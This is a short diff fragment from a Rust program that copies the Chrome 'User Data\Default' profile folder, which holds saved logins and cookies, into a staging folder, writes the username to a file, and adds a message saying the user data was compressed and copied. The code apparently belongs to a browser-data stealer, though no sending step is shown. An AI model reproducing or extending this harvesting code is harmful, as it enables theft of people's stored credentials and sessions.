@@ -58,4 +58,6 @@ fn main() {
     copy(&format!("{}AppData\\Local\\Google\\Chrome\\User Data\\Default", user_path));
 
     fs::write("prep/user_data", &username).expect("[ERR10]");
+
+    println!("User data compressed and copied.");
 }
